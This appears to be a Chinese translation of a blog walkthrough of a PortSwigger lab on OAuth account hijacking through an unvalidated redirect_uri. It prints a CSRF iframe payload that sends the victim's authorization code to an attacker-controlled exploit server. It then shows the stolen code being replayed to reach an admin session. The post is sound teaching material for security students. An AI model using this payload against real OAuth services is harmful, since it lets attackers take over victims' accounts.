<html>
<head>
<title>Exploiting OAuth authentication vulnerabilities Part III</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">利用OAuth认证漏洞第三部分</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/exploiting-oauth-authentication-vulnerabilities-part-iii-e3db79c83359?source=collection_archive---------0-----------------------#2022-09-13">https://infosecwriteups.com/exploiting-oauth-authentication-vulnerabilities-part-iii-e3db79c83359?source=collection_archive---------0-----------------------#2022-09-13</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><h1 id="3d7e" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated"><strong class="ak">简介</strong>:</h1><p id="2015" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">嗨，我的名字是哈沙尔·穆贾希德。我是一名网络安全专业的学生，今天我将展示一些可以用来利用OAuth 2.0并可能允许攻击者完全接管受害者帐户的技术。</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi lj"><img src="../Images/529589434a7e9596ab987feaa91f580b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*0y1fPMtrMxM7S8ac.jpg"/></div></div></figure><h1 id="95cb" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">泄露授权码和访问令牌:</h1><p id="422f" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">如果OAuth 2.0没有正确实现，攻击者可能会获得其他用户的授权令牌，从而允许访问被入侵用户的个人信息。攻击者可以利用这些信息对个人或企业发起额外的攻击。攻击者可能会以受害者用户的身份登录到任何已向OAuth服务注册的客户端应用程序。</p><p id="2c1d" class="pw-post-body-paragraph kl km iq kn b ko lv kq kr ks lw ku kv kw lx ky kz la ly lc ld le lz lg lh li ij bi translated">身份验证令牌泄漏的主要来源是一个开放重定向漏洞。如果OAuth服务提供商无法<strong class="kn ir">验证它希望将令牌传递到的重定向URI </strong>，攻击者可以简单地创建一个CSRF漏洞，误导受害者启动<strong class="kn ir"> OAuth舞蹈</strong>，将令牌泄漏到自己的服务器，并通过代码生成<strong class="kn ir">合法会话</strong>。</p><p id="8579" class="pw-post-body-paragraph kl km iq kn b ko lv kq kr ks lw ku kv kw lx ky kz la ly lc ld le lz lg lh li ij bi translated">让我们看一个攻击的例子。</p><h1 id="fd6c" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">实验:通过redirect_uri劫持OAuth帐户</h1><p id="e651" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">这个<a class="ae ma" href="https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri" rel="noopener ugc nofollow" target="_blank">实验室</a>使用一个<a class="ae ma" href="https://portswigger.net/web-security/oauth" rel="noopener ugc nofollow" target="_blank"> OAuth </a>服务来允许用户使用他们的社交媒体账户登录。OAuth提供者的错误配置使得攻击者能够窃取与其他用户帐户相关的授权码。</p><p id="790c" class="pw-post-body-paragraph kl km iq kn b ko lv kq kr ks lw ku kv kw lx ky kz la ly lc ld le lz lg lh li ij bi translated">为了解决实验室，窃取与管理员用户相关的授权码，然后使用它来访问他们的帐户并删除卡洛斯。</p><p id="9e47" class="pw-post-body-paragraph kl km iq kn b ko lv kq kr ks lw ku kv kw lx ky kz la ly lc ld le lz lg lh li ij bi translated">admin用户将打开您从漏洞服务器发送的任何内容，并且他们始终与OAuth服务保持活动会话。</p><p id="2b3b" class="pw-post-body-paragraph kl km iq kn b ko lv kq kr ks lw ku kv kw lx ky kz la ly lc ld le lz lg lh li ij bi translated">您可以使用以下凭据登录自己的社交媒体帐户:<code class="fe mb mc md me b">wiener:peter</code>。</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi mf"><img src="../Images/f47dd9d66b3317689bbda966f5b6143e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pNoQRqNXcpK5Gnt-8YodZw.png"/></div></div></figure><p id="c58c" class="pw-post-body-paragraph kl km iq kn b ko lv kq kr ks lw ku kv kw lx ky kz la ly lc ld le lz lg lh li ij bi translated">让我们登录网站。</p><p id="3b4d" class="pw-post-body-paragraph kl km iq kn b ko lv kq kr ks lw ku kv kw lx ky kz la ly lc ld le lz lg lh li ij bi translated">在分析了登录过程发出的HTTP请求后，我们可以看到</p><pre class="lk ll lm ln gt mg me mh mi aw mj bi"><span id="482c" class="mk jo iq me b gy ml mm l mn mo">GET auth/?client_id=bosywau2jq24g1mzj9g0y&amp;redirect_uri=<a class="ae ma" href="https://0ac100a704b40f56c0c8db62008d003e.web-security-academy.net/oauth-callback&amp;response_type=code&amp;scope=openid%20profile%20email" rel="noopener ugc nofollow" target="_blank">https://0ac100a704b40f56c0c8db62008d003e.web-security-academy.net/oauth-callback&amp;response_type=code&amp;scope=openid%20profile%20email</a></span></pre><p id="ebe6" class="pw-post-body-paragraph kl km iq kn b ko lv kq kr ks lw ku kv kw lx ky kz la ly lc ld le lz lg lh li ij bi translated">请求导致重定向到参数中存在的URI，并在代码参数中使用新生成的访问令牌。</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi mf"><img src="../Images/9874d20a23dc9b0e0825424850471e7f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gob35GiQ43lErEeKCxEhyA.png"/></div></div><figcaption class="mp mq gj gh gi mr ms bd b be z dk translated">再直接的</figcaption></figure><p id="c964" class="pw-post-body-paragraph kl km iq kn b ko lv kq kr ks lw ku kv kw lx ky kz la ly lc ld le lz lg lh li ij bi translated">让我们测试OAuth服务是否验证了重定向URI。</p><p id="73a9" class="pw-post-body-paragraph kl km iq kn b ko lv kq kr ks lw ku kv kw lx ky kz la ly lc ld le lz lg lh li ij bi translated">将URI更改为任何一个，并查看应用程序是否重定向到该url。</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi mf"><img src="../Images/9efd667976cacea2a0ac070b46c18db7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*o-_hwZ7PAbhh8CVpY0AYLw.png"/></div></div></figure><p id="caf5" class="pw-post-body-paragraph kl km iq kn b ko lv kq kr ks lw ku kv kw lx ky kz la ly lc ld le lz lg lh li ij bi translated">我们可以看到我们的OAuth服务没有验证URI。因此，我们可以利用这一点来设计一个csrf攻击，让用户访问该链接，并将令牌泄露给我们的服务器。</p><p id="d589" class="pw-post-body-paragraph kl km iq kn b ko lv kq kr ks lw ku kv kw lx ky kz la ly lc ld le lz lg lh li ij bi translated">我们需要生成一个CSRF有效载荷。</p><pre class="lk ll lm ln gt mg me mh mi aw mj bi"><span id="ce60" class="mk jo iq me b gy ml mm l mn mo">&lt;html&gt;<br/>&lt;body&gt;<br/>&lt;iframe src="<a class="ae ma" href="https://oauth-0a92006704ef0f46c022db4602810098.web-security-academy.net/auth?client_id=bosywau2jq24g1mzj9g0y&amp;redirect_uri=http://exploit-0a30006504b90f27c0d8dbda017300cb.web-security-academy.net&amp;response_type=code&amp;scope=openid%20profile%20email" rel="noopener ugc nofollow" target="_blank">https://oauth-0a92006704ef0f46c022db4602810098.web-security-academy.net/auth?client_id=bosywau2jq24g1mzj9g0y&amp;redirect_uri=http://exploit-0a30006504b90f27c0d8dbda017300cb.web-security-academy.net&amp;response_type=code&amp;scope=openid%20profile%20email</a>"&gt;&lt;/iframe&gt;</span><span id="3acd" class="mk jo iq me b gy mt mm l mn mo">&lt;/body&gt;<br/>&lt;/html&gt;</span></pre><p id="667e" class="pw-post-body-paragraph kl km iq kn b ko lv kq kr ks lw ku kv kw lx ky kz la ly lc ld le lz lg lh li ij bi translated">我们需要在<code class="fe mb mc md me b">src</code>参数中包含我们的OAuth提供者的主机名，然后我们需要用我们的客户端应用程序ID向<code class="fe mb mc md me b">/auth</code>发出请求，随后是我们的漏洞利用服务器的重定向URI。</p><p id="1fef" class="pw-post-body-paragraph kl km iq kn b ko lv kq kr ks lw ku kv kw lx ky kz la ly lc ld le lz lg lh li ij bi translated">现在将漏洞存储在漏洞服务器上并测试它。</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi mu"><img src="../Images/723d364331de3808836a8bfb70999acb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rWdWxxUUxFo378ToPU-bCA.png"/></div></div></figure><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi mv"><img src="../Images/adb1fbeed4c781b33189a2de40efccc0.png" data-original-src="https://miro.medium.com/v2/resize:fit:890/format:webp/1*wk_j16XrYAUfwLN6mIE9vg.png"/></div><figcaption class="mp mq gj gh gi mr ms bd b be z dk translated">内联框架</figcaption></figure><p id="5d1c" class="pw-post-body-paragraph kl km iq kn b ko lv kq kr ks lw ku kv kw lx ky kz la ly lc ld le lz lg lh li ij bi translated">在我们的访问日志中，我们可以看到一个代码被泄漏。</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi mw"><img src="../Images/fe842bc1fcc5d8a04416391b930a3b43.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9hBiPKuKkbIFHC1IRgN5Xg.png"/></div></div></figure><p id="df0a" class="pw-post-body-paragraph kl km iq kn b ko lv kq kr ks lw ku kv kw lx ky kz la ly lc ld le lz lg lh li ij bi translated">这意味着我们的漏洞正在发挥作用。</p><p id="d69a" class="pw-post-body-paragraph kl km iq kn b ko lv kq kr ks lw ku kv kw lx ky kz la ly lc ld le lz lg lh li ij bi translated">我们把它送给受害者吧。</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi mx"><img src="../Images/eee32bc061c21273486e5fa1b4dac7ec.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ls5eGljihrjgDsNtlc735Q.png"/></div></div></figure><p id="6b56" class="pw-post-body-paragraph kl km iq kn b ko lv kq kr ks lw ku kv kw lx ky kz la ly lc ld le lz lg lh li ij bi translated">你会收到代码，现在你需要做的就是将代码粘贴到<code class="fe mb mc md me b">callback</code>请求中。</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi my"><img src="../Images/6d1ff56905c1349e947cab0c78a3e99c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qv5PKf8qe_i9KYpzS_VGCg.png"/></div></div></figure><p id="039b" class="pw-post-body-paragraph kl km iq kn b ko lv kq kr ks lw ku kv kw lx ky kz la ly lc ld le lz lg lh li ij bi translated">我们可以看到现在生成了一个新的会话，只需复制该会话并用之前的会话替换它。</p><pre class="lk ll lm ln gt mg me mh mi aw mj bi"><span id="1ff2" class="mk jo iq me b gy ml mm l mn mo">rbNzL8wKTP0SXLULBFvOgNZzJ89Hbpgg</span></pre><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi mf"><img src="../Images/94b81f32118f86dfbd3dceb9fc2d24d7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tRu8aDkOLFOvy7nfgST2sw.png"/></div></div><figcaption class="mp mq gj gh gi mr ms bd b be z dk translated">管理</figcaption></figure><p id="3304" class="pw-post-body-paragraph kl km iq kn b ko lv kq kr ks lw ku kv kw lx ky kz la ly lc ld le lz lg lh li ij bi translated">我们可以在这里看到一个管理面板。</p><p id="2614" class="pw-post-body-paragraph kl km iq kn b ko lv kq kr ks lw ku kv kw lx ky kz la ly lc ld le lz lg lh li ij bi translated">现在刷新页面，删除Carlos。</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi mf"><img src="../Images/d57409f07298d562798ab01a960bc57a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*M2IeSjA8EDkaJGnLhTBjQg.png"/></div></div><figcaption class="mp mq gj gh gi mr ms bd b be z dk translated">删除卡洛斯</figcaption></figure><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi mf"><img src="../Images/ba82d8e15756e0b9bec54d45388a417a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HfsrJMLutM15iBKL-lnX7g.png"/></div></div></figure><p id="76dd" class="pw-post-body-paragraph kl km iq kn b ko lv kq kr ks lw ku kv kw lx ky kz la ly lc ld le lz lg lh li ij bi translated">这就是使用泄漏的访问令牌生成认证会话的方法。</p><figure class="lk ll lm ln gt lo"><div class="bz fp l di"><div class="mz na l"/></div></figure><p id="91d8" class="pw-post-body-paragraph kl km iq kn b ko lv kq kr ks lw ku kv kw lx ky kz la ly lc ld le lz lg lh li ij bi translated">下次见！快乐黑客❤</p></div><div class="ab cl nb nc hu nd" role="separator"><span class="ne bw bk nf ng nh"/><span class="ne bw bk nf ng nh"/><span class="ne bw bk nf ng"/></div><div class="ij ik il im in"><h2 id="d44b" class="mk jo iq bd jp ni nj dn jt nk nl dp jx kw nm nn kb la no np kf le nq nr kj ns bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae ma" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>，以5篇文章、4条线索、3个视频、2个Github Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>